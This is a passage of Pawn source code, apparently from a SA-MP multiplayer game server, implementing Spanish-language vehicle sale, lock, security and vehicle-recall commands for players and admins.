    	return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Este vehiculo es temporal y no esta en venta.");
	}
	if(VehicleInfo[GetPlayerVehicleID(playerid)][ConObjetos] == 1) {
	    return SendClientMessage(playerid,red, "|Error| »{EAEAEA} Este vehiculo posee objetos y no esta en venta.");
	}

    if(PlayerInfo[playerid][LoggedIn] == 0) {
	    SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
	    return 1;
	}
	if(passenger[playerid] == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes ser el conductor");
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid) == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar en el vehiculo.");
		return 1;
	}
	if(VehicleInfo[GetPlayerVehicleID(playerid)][buybar] == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya esta en venta.");
		return 1;
	}
	if (PlayerInfo[playerid][Level] >= 9) {
		if(VehicleInfo[GetPlayerVehicleID(playerid)][buybar] == 1) {
			format(string,sizeof(string),"|Info| »{EAEAEA} Has puesto el vehiculo {5783C2}%s{EAEAEA} en venta", VehicleInfo[GetPlayerVehicleID(playerid)][name]);
			SendClientMessage(playerid,red,string);
			VehicleInfo[GetPlayerVehicleID(playerid)][buybar] = 0;
			return 1;
		}
	}
	SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 9{EAEAEA} para usar este comando.");
	return 1;
}

stock setunbuy(playerid)
{
	new string[128];
    if(VehicleInfo[GetPlayerVehicleID(playerid)][Temp] == 1) {
    	return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Este vehiculo es temporal y no esta en venta.");
	}
	if(VehicleInfo[GetPlayerVehicleID(playerid)][ConObjetos] == 1) {
	    return SendClientMessage(playerid,red, "|Error| »{EAEAEA} Este vehiculo posee objetos y no esta en venta.");
	}
    if(PlayerInfo[playerid][LoggedIn] == 0) {
	    SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
	    return 1;
	}
	if(passenger[playerid] == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes ser el conductor");
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid) == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar en el vehiculo.");
		return 1;
	}
	if(VehicleInfo[GetPlayerVehicleID(playerid)][buybar] == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya le han quitado la venta.");
		return 1;
	}
	if (PlayerInfo[playerid][Level] >= 10) {
		VehicleInfo[GetPlayerVehicleID(playerid)][bought] = 0;
		VehicleInfo[GetPlayerVehicleID(playerid)][secure] = 0;
		VehicleInfo[GetPlayerVehicleID(playerid)][buybar] = 1;
		if (strcmp(VehicleInfo[GetPlayerVehicleID(playerid)][owner],DEFAULT_OWNER,false) == 0) {
			strmid(VehicleInfo[GetPlayerVehicleID(playerid)][owner], DEFAULT_OWNER, 0, strlen(DEFAULT_OWNER), 255);
			format(string,sizeof(string),"|Info| »{EAEAEA} Les has quitado la venta al vehiculo {5783C2}%s.",VehicleInfo[GetPlayerVehicleID(playerid)][name]);
			SendClientMessage(playerid,red,string);
			return 1;
		}
		new file[256];
		format(file,sizeof(file),"/ladmin/users/%s.sav",VehicleInfo[GetPlayerVehicleID(playerid)][owner]);
		if(fexist(file)) {
			tempid[playerid] = IsPlayerNameOnline(VehicleInfo[GetPlayerVehicleID(playerid)][owner]);
			if(tempid[playerid] >= 0 || tempid[playerid] <= MAX_PLAYERS) {
				strmid(VehicleInfo[GetPlayerVehicleID(playerid)][owner], DEFAULT_OWNER, 0, strlen(DEFAULT_OWNER), 255);
				if(PlayerInfo[tempid[playerid]][vowned] == GetPlayerVehicleID(playerid)){
					PlayerInfo[tempid[playerid]][vowner] = 0;
					PlayerInfo[tempid[playerid]][vowned] = 0;
				}
				else if(PlayerInfo[tempid[playerid]][vowned2] == GetPlayerVehicleID(playerid)){
					PlayerInfo[tempid[playerid]][vowner2] = 0;
					PlayerInfo[tempid[playerid]][vowned2] = 0;
				}
				else if(PlayerInfo[tempid[playerid]][vowned3] == GetPlayerVehicleID(playerid)){
					PlayerInfo[tempid[playerid]][vowner3] = 0;
					PlayerInfo[tempid[playerid]][vowned3] = 0;
				}
				else if(PlayerInfo[tempid[playerid]][vowned4] == GetPlayerVehicleID(playerid)){
					PlayerInfo[tempid[playerid]][vowner4] = 0;
					PlayerInfo[tempid[playerid]][vowned4] = 0;
				}
				else if(PlayerInfo[tempid[playerid]][vowned5] == GetPlayerVehicleID(playerid)){
					PlayerInfo[tempid[playerid]][vowner5] = 0;
					PlayerInfo[tempid[playerid]][vowned5] = 0;
				}
				else if(PlayerInfo[tempid[playerid]][vowned6] == GetPlayerVehicleID(playerid)){
					PlayerInfo[tempid[playerid]][vowner6] = 0;
					PlayerInfo[tempid[playerid]][vowned6] = 0;
				}
				else if(PlayerInfo[tempid[playerid]][vowned7] == GetPlayerVehicleID(playerid)){
					PlayerInfo[tempid[playerid]][vowner7] = 0;
					PlayerInfo[tempid[playerid]][vowned7] = 0;
				}
				else if(PlayerInfo[tempid[playerid]][vowned8] == GetPlayerVehicleID(playerid)){
					PlayerInfo[tempid[playerid]][vowner8] = 0;
					PlayerInfo[tempid[playerid]][vowned8] = 0;
				}
				else if(PlayerInfo[tempid[playerid]][vowned9] == GetPlayerVehicleID(playerid)){
					PlayerInfo[tempid[playerid]][vowner9] = 0;
					PlayerInfo[tempid[playerid]][vowned9] = 0;
				}
				else if(PlayerInfo[tempid[playerid]][vowned10] == GetPlayerVehicleID(playerid)){
					PlayerInfo[tempid[playerid]][vowner10] = 0;
					PlayerInfo[tempid[playerid]][vowned10] = 0;
				}
				format(string, sizeof(string), "|Info| »{EAEAEA} Le has quitado la venta al vehiculo {5783C2}%s{EAEAEA} de {0080FF}%s.", VehicleInfo[GetPlayerVehicleID(playerid)][name], PlayerInfo[tempid[playerid]][name]);
				SendClientMessage(playerid, red, string);
				format(string, sizeof(string), "|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} le ha quitado la venta a tu {5783C2}%s.", VehicleInfo[GetPlayerVehicleID(playerid)][name], PlayerInfo[playerid][name]);
				SendClientMessage(tempid[playerid], red, string);
				return 1;
			}
			else {
				ResetOfflinePlayerFileV(file,GetPlayerVehicleID(playerid));
				format(string, sizeof(string), "|Info| »{EAEAEA} Le has quitado la venta al vehiculo {5783C2}%s{EAEAEA} de {0080FF}%s.", VehicleInfo[GetPlayerVehicleID(playerid)][name], VehicleInfo[GetPlayerVehicleID(playerid)][owner]);
				return 1;
			}
		}
		if(!fexist(file)) {
			format(string, sizeof(string), "|Info| »{EAEAEA} Le has quitado la venta al vehiculo {5783C2}%s{EAEAEA} de {0080FF}%s.", VehicleInfo[GetPlayerVehicleID(playerid)][name], VehicleInfo[GetPlayerVehicleID(playerid)][owner]);
			SendClientMessage(playerid, red, string);
			strmid(VehicleInfo[GetPlayerVehicleID(playerid)][owner], DEFAULT_OWNER, 0, strlen(DEFAULT_OWNER), 255);
			return 1;
		}
	}
	SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 9{EAEAEA} para usar este comando.");
	return 1;
}

stock lock(playerid)
{
	if(IsPlayerInAnyVehicle(playerid))
	{
	    if(VehicleInfo[GetPlayerVehicleID(playerid)][Temp] == 1) {
	    	return SendClientMessage(playerid, red,"|Error| »{EAEAEA} Este vehiculo es temporal.");
		}
		if(VehicleInfo[GetPlayerVehicleID(playerid)][ConObjetos] == 1) {
	    	return SendClientMessage(playerid,red, "|Error| »{EAEAEA} Este vehiculo posee objetos.");
		}

		new State=GetPlayerState(playerid);
		if(State!=PLAYER_STATE_DRIVER)
		{
			SendClientMessage(playerid,red, "|Error| »{EAEAEA} Debes ser el conductor.");
			return 1;
		}
		SetVehicleParamsForPlayer(GetPlayerVehicleID(playerid),playerid,false,true);
		format(lockmess,sizeof(lockmess),"|Info| »{EAEAEA} Has bloqueado tu {5783C2}%s.",VehicleName[GetVehicleModel(GetPlayerVehicleID(playerid))-400][0]);
		SendClientMessage(playerid,red, lockmess);
		new Float:pX, Float:pY, Float:pZ;
		GetPlayerPos(playerid,pX,pY,pZ);
		PlayerPlaySound(playerid,1056,pX,pY,pZ);
		PlayerInfo[playerid][DoorsLocked] = 1;
	}
	else
	{
		SendClientMessage(playerid, red,"|Error| »{EAEAEA} Debes estar en tu vehiculo");
	}
	return 1;
}


stock unlock(playerid)
{
	if(IsPlayerInAnyVehicle(playerid))
	{
	    if(VehicleInfo[GetPlayerVehicleID(playerid)][Temp] == 1) {
	    	return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Este vehiculo es temporal.");
		}
		if(VehicleInfo[GetPlayerVehicleID(playerid)][ConObjetos] == 1) {
	   	 	return SendClientMessage(playerid,red, "|Error| »{EAEAEA} Este vehiculo posee objetos.");
		}
		new State=GetPlayerState(playerid);
		if(State!=PLAYER_STATE_DRIVER)
		{
			SendClientMessage(playerid,red, "|Error| »{EAEAEA} Debes ser el conductor.");
			return 1;
		}
		new i;
		for(i=0;i<GetMaxPlayers();i++)
		{
			SetVehicleParamsForPlayer(GetPlayerVehicleID(playerid),playerid,false,false);
		}
		format(lockmess,sizeof(lockmess),"|Info| »{EAEAEA} Has desbloqueado tu vehiculo {5783C2}%s.",VehicleName[GetVehicleModel(GetPlayerVehicleID(playerid))-400][0]);
		SendClientMessage(playerid,red, lockmess);
		new Float:pX, Float:pY, Float:pZ;
		GetPlayerPos(playerid,pX,pY,pZ);
		PlayerPlaySound(playerid,1057,pX,pY,pZ);
		PlayerInfo[playerid][DoorsLocked] = 0;
	}
	else
	{
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar en tu vehiculo.");
	}
	return 1;
}

stock securekick(playerid)
{
    if(VehicleInfo[GetPlayerVehicleID(playerid)][Temp] == 1) {
    	return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Este vehiculo es temporal.");
	}
	if(VehicleInfo[GetPlayerVehicleID(playerid)][ConObjetos] == 1) {
	   	return SendClientMessage(playerid,red, "|Error| »{EAEAEA} Este vehiculo posee objetos.");
	}
    if(PlayerInfo[playerid][LoggedIn] == 0) {
	    SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
	    return 1;
	}
	if(VehicleInfo[GetPlayerVehicleID(playerid)][buybar] == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Este vehiculo no esta en venta.");
		return 1;
	}
	if((PlayerInfo[playerid][vowner] == 0) && (PlayerInfo[playerid][vowner2] == 0) && (PlayerInfo[playerid][vowner3] == 0) && (PlayerInfo[playerid][vowner4] == 0) && (PlayerInfo[playerid][vowner5] == 0) && (PlayerInfo[playerid][vowner6] == 0) && (PlayerInfo[playerid][vowner7] == 0) && (PlayerInfo[playerid][vowner8] == 0)) {
		if((PlayerInfo[playerid][vowner9] == 0) && (PlayerInfo[playerid][vowner10] == 0)){
			SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar en tu vehiculo.");
			return 1;
		}
	}
	if(IsPlayerInAnyVehicle(playerid)) {
		if (strcmp(VehicleInfo[GetPlayerVehicleID(playerid)][owner],PlayerInfo[playerid][name],false) == 0) {
			VehicleInfo[GetPlayerVehicleID(playerid)][secure] = 1;
			format(securemess,sizeof(securemess),"|Info| »{EAEAEA} Has bloqueado tu vehiculo {5783C2}%s.", VehicleInfo[GetPlayerVehicleID(playerid)][name]);
			SendClientMessage(playerid, red, securemess);
			return 1;
		}
		else {
			SendClientMessage(playerid, red, "|Error| »{EAEAEA} Este vehiculo no es tuyo.");
			return 1;
		}
	}
	else {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar en tu vehiculo.");
		return 1;
	}
}

stock asecurekick(playerid)
{
	if (PlayerInfo[playerid][Level] >= 9 || IsPlayerAdmin(playerid)) {
	    if(VehicleInfo[GetPlayerVehicleID(playerid)][Temp] == 1) {
	    	return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Este vehiculo es temporal.");
		}
		if(VehicleInfo[GetPlayerVehicleID(playerid)][ConObjetos] == 1) {
	   	 	return SendClientMessage(playerid,red, "|Error| »{EAEAEA} Este vehiculo posee objetos.");
		}
	    if(PlayerInfo[playerid][LoggedIn] == 0) {
		    SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
		    return 1;
		}
		if(IsPlayerInAnyVehicle(playerid)) {
			VehicleInfo[GetPlayerVehicleID(playerid)][asecure] = 1;
			format(securemess,sizeof(securemess),"|Info| »{EAEAEA} Le has puesto bloqueo de admin a tu vehiculo {5783C2}%s.", VehicleInfo[GetPlayerVehicleID(playerid)][name]);
			SendClientMessage(playerid, red, securemess);
			return 1;
		}
		else {
			SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar en tu vehiculo.");
			return 1;
		}
	}
	else {

		return 1;
	}
}

stock asecurekill(playerid)
{
	if(IsPlayerInAnyVehicle(playerid)) {
	    if(VehicleInfo[GetPlayerVehicleID(playerid)][Temp] == 1) {
	    	return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Este vehiculo es temporal.");
		}
		if(VehicleInfo[GetPlayerVehicleID(playerid)][ConObjetos] == 1) {
	   	 	return SendClientMessage(playerid,red, "|Error| »{EAEAEA} Este vehiculo posee objetos.");
		}
	    if(PlayerInfo[playerid][LoggedIn] == 0) {
		    SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
		    return 1;
		}
		if (PlayerInfo[playerid][Level] >= 9 || IsPlayerAdmin(playerid)) {
			VehicleInfo[GetPlayerVehicleID(playerid)][asecure] = 2;
			format(securemess,sizeof(securemess),"|Info| »{EAEAEA} Le has puesto bloqueo de admin a tu vehiculo {5783C2}%s.", VehicleInfo[GetPlayerVehicleID(playerid)][name]);
			SendClientMessage(playerid, red, securemess);
			return 1;
		}
		else {
			SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 9{EAEAEA} para usar este comando.");
			return 1;
		}
	}
	else {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar en tu vehiculo.");
		return 1;
	}
}

stock aunsecure(playerid)
{
	if(IsPlayerInAnyVehicle(playerid)) {
	    if(VehicleInfo[GetPlayerVehicleID(playerid)][Temp] == 1) {
	    	return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Este vehiculo es temporal.");
		}
		if(VehicleInfo[GetPlayerVehicleID(playerid)][ConObjetos] == 1) {
	   	 	return SendClientMessage(playerid,red, "|Error| »{EAEAEA} Este vehiculo posee objetos.");
		}
	    if(PlayerInfo[playerid][LoggedIn] == 0) {
		    SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
		    return 1;
		}
		if (PlayerInfo[playerid][Level] >= 9 || IsPlayerAdmin(playerid)) {
			VehicleInfo[GetPlayerVehicleID(playerid)][asecure] = 0;
			format(securemess,sizeof(securemess),"|Info| »{EAEAEA} Has desbloqueado tu vehiculo {5783C2}%s.", VehicleInfo[GetPlayerVehicleID(playerid)][name]);
			SendClientMessage(playerid, red, securemess);
			return 1;
		}
		else {
			SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 9{EAEAEA} para usar este comando.");
			return 1;
		}
	}
	else {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar en tu vehiculo.");
		return 1;
	}
}

stock unsecure(playerid)
{
    if(VehicleInfo[GetPlayerVehicleID(playerid)][Temp] == 1) {
    	return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Este vehiculo es temporal.");
	}
	if(VehicleInfo[GetPlayerVehicleID(playerid)][ConObjetos] == 1) {
	   	return SendClientMessage(playerid,red, "|Error| »{EAEAEA} Este vehiculo posee objetos.");
	}
    if(PlayerInfo[playerid][LoggedIn] == 0) {
	    SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
	    return 1;
	}
	if(VehicleInfo[GetPlayerVehicleID(playerid)][buybar] == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Este vehiculo no esta en venta.");
		return 1;
	}
	if((PlayerInfo[playerid][vowner] == 0) && (PlayerInfo[playerid][vowner2] == 0) && (PlayerInfo[playerid][vowner3] == 0) && (PlayerInfo[playerid][vowner4] == 0) && (PlayerInfo[playerid][vowner5] == 0) && (PlayerInfo[playerid][vowner6] == 0) && (PlayerInfo[playerid][vowner7] == 0) && (PlayerInfo[playerid][vowner8] == 0)) {
		if((PlayerInfo[playerid][vowner9] == 0) && (PlayerInfo[playerid][vowner10] == 0)){
			SendClientMessage(playerid, red, "|Error| »{EAEAEA} No eres el dueño del vehiculo.");
			return 1;
		}
	}
	if(IsPlayerInAnyVehicle(playerid)) {
		if (strcmp(VehicleInfo[GetPlayerVehicleID(playerid)][owner],PlayerInfo[playerid][name],false) == 0) {
			VehicleInfo[GetPlayerVehicleID(playerid)][secure] = 0;
			format(securemess,sizeof(securemess),"|Info| »{EAEAEA} Has desbloqueado tu vehiculo {5783C2}%s.", VehicleInfo[GetPlayerVehicleID(playerid)][name]);
			SendClientMessage(playerid, red, securemess);
			return 1;
		}
		else {
			SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar en tu vehiculo.");
			return 1;
		}
	}
	else {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar en tu vehiculo.");
		return 1;
	}
}

stock securekill(playerid)
{
    if(VehicleInfo[GetPlayerVehicleID(playerid)][Temp] == 1) {
    	return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Este vehiculo es temporal.");
	}
	if(VehicleInfo[GetPlayerVehicleID(playerid)][ConObjetos] == 1) {
	   	return SendClientMessage(playerid,red, "|Error| »{EAEAEA} Este vehiculo posee objetos.");
	}
    if(PlayerInfo[playerid][LoggedIn] == 0) {
	    SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
	    return 1;
	}
	if(VehicleInfo[GetPlayerVehicleID(playerid)][buybar] == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Este vehiculo no esta en venta.");
		return 1;
	}
	if((PlayerInfo[playerid][vowner] == 0) && (PlayerInfo[playerid][vowner2] == 0) && (PlayerInfo[playerid][vowner3] == 0) && (PlayerInfo[playerid][vowner4] == 0) && (PlayerInfo[playerid][vowner5] == 0) && (PlayerInfo[playerid][vowner6] == 0) && (PlayerInfo[playerid][vowner7] == 0) && (PlayerInfo[playerid][vowner8] == 0)) {
		if((PlayerInfo[playerid][vowner9] == 0) && (PlayerInfo[playerid][vowner10] == 0)){
			SendClientMessage(playerid, red, "|Error| »{EAEAEA} No eres el dueño del vehiculo.");
			return 1;
		}
	}
	if(IsPlayerInAnyVehicle(playerid)) {
		if (strcmp(VehicleInfo[GetPlayerVehicleID(playerid)][owner],PlayerInfo[playerid][name],false) == 0) {
			VehicleInfo[GetPlayerVehicleID(playerid)][secure] = 2;
			format(securemess,sizeof(securemess),"|Info| »{EAEAEA} Le has puesto bloqueo de admin a tu vehiculo {5783C2}%s.", VehicleInfo[GetPlayerVehicleID(playerid)][name]);
			SendClientMessage(playerid, red, securemess);
			return 1;
		}
		else {
			SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar en tu vehiculo.");
			return 1;
		}
	}
	else {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar en tu vehiculo.");
		return 1;
	}
}

stock callcar(playerid)
{
    if(PlayerInfo[playerid][LoggedIn] == 0) {
	    SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
	    return 1;
	}
	if(PlayerInterior[playerid] > 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar afuera para usar este comando.");
		return 1;
	}
	if(PlayerInfo[playerid][vowner] == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} No tienes vehiculo en esta ranura.");
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid) == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya estas en un vehiculo.");
		return 1;
	}
	if(VehicleInfo[PlayerInfo[playerid][vowned]][modding] == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Estan usando este vehiculo.");
		return 1;
	}
	for(new i=0; i < MAX_PLAYERS; i++) {
		if (IsPlayerConnected(i) == 1) {
			if (IsPlayerInAnyVehicle(i) == 1) {
				if (GetPlayerVehicleID(i) == PlayerInfo[playerid][vowned]) {
					if(GetPlayerInterior(i) == 1) {
						SendClientMessage(playerid, red, "|Error| »{EAEAEA} Estan usando este vehiculo.");
						return 1;
					}
					//SendClientMessage(i, red, "This vehicle has been recalled by its owner, enjoy the walk!");
				}
			}
		}
	}
	SendClientMessage(playerid, red, "|Info| »{EAEAEA} Tu vehículo está en camino. Tardará unos 5 segundos en llegar...");
	SetVehicleToRespawn(PlayerInfo[playerid][vowned]);
	SetVehicleVirtualWorld(PlayerInfo[playerid][vowned],10);
	SetTimerEx("CallVehicleToPlayer",5000,0,"i",playerid);
	return 1;
}
stock callcar2(playerid)
{
    if(PlayerInfo[playerid][LoggedIn] == 0) {
	    SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
	    return 1;
	}
	if(PlayerInterior[playerid] > 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar afuera para usar este comando.");
		return 1;
	}
	if(PlayerInfo[playerid][vowner2] == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} No tienes vehiculo en esta ranura.");
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid) == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya estas en un vehiculo.");
		return 1;
	}
	if(VehicleInfo[PlayerInfo[playerid][vowned2]][modding] == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Estan usando este vehiculo.");
		return 1;
	}
	for(new i=0; i < MAX_PLAYERS; i++) {
		if (IsPlayerConnected(i) == 1) {
			if (IsPlayerInAnyVehicle(i) == 1) {
				if (GetPlayerVehicleID(i) == PlayerInfo[playerid][vowned2]) {
					if(GetPlayerInterior(i) == 1) {
						SendClientMessage(playerid, red, "|Error| »{EAEAEA} Estan usando este vehiculo.");
						return 1;
					}
					//SendClientMessage(i, red, "This vehicle has been recalled by its owner, enjoy the walk!");
				}
			}
		}
	}
	SendClientMessage(playerid, red, "|Info| »{EAEAEA} Tu vehículo está en camino. Tardará unos 5 segundos en llegar...");
	SetVehicleToRespawn(PlayerInfo[playerid][vowned2]);
	SetVehicleVirtualWorld(PlayerInfo[playerid][vowned2],10);
	SetTimerEx("CallVehicle2ToPlayer",5000,0,"i",playerid);
	return 1;
}
stock callcar3(playerid)
{
    if(PlayerInfo[playerid][LoggedIn] == 0) {
	    SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
	    return 1;
	}
	if(PlayerInterior[playerid] > 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar afuera para usar este comando.");
		return 1;
	}
	if(PlayerInfo[playerid][vowner3] == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} No tienes vehiculo en esta ranura.");
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid) == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya estas en un vehiculo.");
		return 1;
	}
	if(VehicleInfo[PlayerInfo[playerid][vowned3]][modding] == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Estan usando este vehiculo.");
		return 1;
	}
	for(new i=0; i < MAX_PLAYERS; i++) {
		if (IsPlayerConnected(i) == 1) {
			if (IsPlayerInAnyVehicle(i) == 1) {
				if (GetPlayerVehicleID(i) == PlayerInfo[playerid][vowned3]) {
					if(GetPlayerInterior(i) == 1) {
						SendClientMessage(playerid, red, "|Error| »{EAEAEA} Estan usando este vehiculo.");
						return 1;
					}
					//SendClientMessage(i, red, "This vehicle has been recalled by its owner, enjoy the walk!");
				}
			}
		}
	}
	SendClientMessage(playerid, red, "|Info| »{EAEAEA} Tu vehículo está en camino. Tardará unos 5 segundos en llegar...");
	SetVehicleToRespawn(PlayerInfo[playerid][vowned3]);
	SetVehicleVirtualWorld(PlayerInfo[playerid][vowned3],10);
	SetTimerEx("CallVehicle3ToPlayer",5000,0,"i",playerid);
	return 1;
}
stock callcar4(playerid)
{
    if(PlayerInfo[playerid][LoggedIn] == 0) {
	    SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
	    return 1;
	}
	if(PlayerInterior[playerid] > 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar afuera para usar este comando.");
		return 1;
	}
	if(PlayerInfo[playerid][vowner4] == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} No tienes vehiculo en esta ranura.");
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid) == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya estas en un vehiculo.");
		return 1;
	}
	if(VehicleInfo[PlayerInfo[playerid][vowned4]][modding] == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Estan usando este vehiculo.");
		return 1;
	}
	for(new i=0; i < MAX_PLAYERS; i++) {
		if (IsPlayerConnected(i) == 1) {
			if (IsPlayerInAnyVehicle(i) == 1) {
				if (GetPlayerVehicleID(i) == PlayerInfo[playerid][vowned4]) {
					if(GetPlayerInterior(i) == 1) {
						SendClientMessage(playerid, red, "|Error| »{EAEAEA} Estan usando este vehiculo.");
						return 1;
					}
					//SendClientMessage(i, red, "This vehicle has been recalled by its owner, enjoy the walk!");
				}
			}
		}
	}
	SendClientMessage(playerid, red, "|Info| »{EAEAEA} Tu vehículo está en camino. Tardará unos 5 segundos en llegar...");
	SetVehicleToRespawn(PlayerInfo[playerid][vowned4]);
	SetVehicleVirtualWorld(PlayerInfo[playerid][vowned4],10);
	SetTimerEx("CallVehicle4ToPlayer",5000,0,"i",playerid);
	return 1;
}
stock callcar5(playerid)
{
    if(PlayerInfo[playerid][LoggedIn] == 0) {
	    SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
	    return 1;
 	}
	if(PlayerInterior[playerid] > 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar afuera para usar este comando.");
		return 1;
	}
	if(PlayerInfo[playerid][vowner5] == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} No tienes vehiculo en esta ranura.");
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid) == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya estas en un vehiculo.");
		return 1;
	}
	if(VehicleInfo[PlayerInfo[playerid][vowned5]][modding] == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Estan usando este vehiculo.");
		return 1;
	}
	for(new i=0; i < MAX_PLAYERS; i++) {
		if (IsPlayerConnected(i) == 1) {
			if (IsPlayerInAnyVehicle(i) == 1) {
				if (GetPlayerVehicleID(i) == PlayerInfo[playerid][vowned5]) {
					if(GetPlayerInterior(i) == 1) {
						SendClientMessage(playerid, red, "|Error| »{EAEAEA} Estan usando este vehiculo.");
						return 1;
					}
					//SendClientMessage(i, red, "This vehicle has been recalled by its owner, enjoy the walk!");
				}
			}
		}
	}
	SendClientMessage(playerid, red, "|Info| »{EAEAEA} Tu vehículo está en camino. Tardará unos 5 segundos en llegar...");
	SetVehicleToRespawn(PlayerInfo[playerid][vowned5]);
	SetVehicleVirtualWorld(PlayerInfo[playerid][vowned5],10);
	SetTimerEx("CallVehicle5ToPlayer",5000,0,"i",playerid);
	return 1;
}
stock callcar6(playerid)
{
    if(PlayerInfo[playerid][LoggedIn] == 0) {
	    SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar registrado para poder usar este comando.");
	    return 1;
	}
	if(PlayerInterior[playerid] > 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar afuera para usar este comando.");
		return 1;
	}
	if(PlayerInfo[playerid][vowner6] == 0) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} No tienes vehiculo en esta ranura.");
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid) == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Ya estas en un vehiculo.");
		return 1;
	}
	if(VehicleInfo[PlayerInfo[playerid][vowned6]][modding] == 1) {
		SendClientMessage(playerid, red, "|Error| »{EAEAEA} Estan usando este vehiculo.");
		return 1;
	}
	for(new i=0; i < MAX_PLAYERS; i++) {
		if (IsPlayerConnected(i) == 1) {
			if (IsPlayerInAnyVehicle(i) == 1) {
				if (GetPlayerVehicleID(i) == PlayerInfo[playerid][vowned6]) {
					if(GetPlayerInterior(i) == 1) {
						SendClientMessage(playerid, red, "|Error| »{EAEAEA} Estan usando este vehiculo.");
						return 1;
					}
					//SendClientMessage(i, red, "This vehicle has been recalled by its owner, enjoy the walk!");
				}
			}
		}
	}
	SendClientMessage(playerid, red, "|Info| »{EAEAEA} Tu vehículo está en camino. Tardará unos 5 segundos en llegar...");
	SetVehicleToRespawn(PlayerInfo[playerid][vowned6]);
	SetVehicleVirtualWorld(PlayerInfo[playerid][vowned6],10);
	SetTimerEx("CallVehicle6ToPlayer",5000,0,"i",playerid);
	return 1;
}
stock callcar7(playerid)
{
    if(PlayerInfo[playerid][LoggedIn] == 0) {
